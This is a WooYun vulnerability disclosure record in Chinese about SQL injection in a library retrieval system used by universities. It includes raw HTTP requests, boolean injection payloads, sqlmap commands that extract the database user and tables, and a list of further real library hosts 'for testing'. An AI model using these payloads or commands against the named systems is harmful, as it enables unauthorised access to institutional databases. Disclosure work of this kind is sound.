{"id": 42980, "wybug_id": "wooyun-2014-084197", "wybug_title": "某图书检索系统存在SQL注入漏洞", "wybug_corp": "北京创讯未来软件技术有限公司", "wybug_author": "大象", "wybug_date": "2014-11-24 01:18", "wybug_open_date": "2015-02-22 01:20", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-24：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-02-22：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 大量科研单位和高校在使用该系统。 详细说明：  北京创讯未来软件技术有限公司开发的，该公司的网址http://www.bcrj.com.cn/\n\n用户量应该不小。提交前搜索了下，发现已经有人提交过该公司的问题了。但此次提交的并非同一问题，也并非同一系统，并不重复。#1该系统存在多处注入，以http://210.30.190.28/ 为例预约通知处存在post注入。\n\n\nPOST /note/holdretrieve.jsp?kind=query HTTP/1.1Host: 210.30.190.28Proxy-Connection: keep-aliveContent-Length: 45Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://210.30.190.28User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://210.30.190.28/note/holdretrieve.jsp?kind=queryAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4Cookie: JSESSIONID=C46E1F76BD5D7E8D8F68EDC70C0361D9barcode=11&fangshi=1&title=22&B1=%C8%B7%B6%A8\nBarcode参数存在注入。\n\n\n\n新书通报处get型注入：http://210.30.190.28/newbook/queryOut.jsp?classname=%B7%A8%C2%C9%C0%E0这里的注入就比较有意思了。http://210.30.190.28/newbook/queryOut.jsp?classname=%B7%A8%C2%C9%C0%E0' and ‘1’=’1正常\n\nhttp://210.30.190.28/newbook/queryOut.jsp?classname=%D3%A2%D3%EF%27%20and%20%271%27=%272返回空白\n\n此处应该是明显存在注入的，我直接放拿sqlmap试了试却告诉我无法注入，明显不科学啊。后来我多次尝试，发现如果关闭浏览器重新打开http://210.30.190.28/newbook/queryOut.jsp?classname=%B7%A8%C2%C9%C0%E0显示的并非正常页面。而是\n\n所以我觉得是cookie的因素，于是重新点击新书通报，选择一个类别检索，在页面显示正常的情况下刷新页面抓包保存，再拿到SQLMAP里跑。\nGET /newbook/queryOut.jsp?classname=%D3%A2%D3%EF HTTP/1.1Host: 210.30.190.28Proxy-Connection: keep-aliveCache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4Cookie: JSESSIONID=C46E1F76BD5D7E8D8F68EDC70C0361D9\n\n\n这次就可以正常注入了。但是请注意，如果你再次检索其他类别，该cookie就会失效了。   漏洞证明：  提供几个其他案例供测试:\nhttp://opac.cgl.org.cn/note/holdretrieve.jsphttp://opac.lib.buct.edu.cn/note/holdretrieve.jsphttp://opac.hebut.edu.cn:8080/note/holdretrieve.jsphttp://219.147.57.36:60/note/holdretrieve.jsphttp://opac.cgl.org.cn/note/holdretrieve.jsp\n最后本来以为就完了，结果又发现了问题，跑不出除库名以外的其他数据。最后自己手工测试了下才发现问题，sqlmap给出的数据库是SQL sever，但又给不出具体版本。实则数据库应为Sybase。修改数据库为Sybase就能用sqlmap正常跑出数据了。\nSqlmap -r 1.txt --dbms Sybase --current-user\n\n\nSqlmap -r 1.txt --dbms Sybase -D melinets --tables\n\n   修复方案：     版权声明：转载请注明来源 大象@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}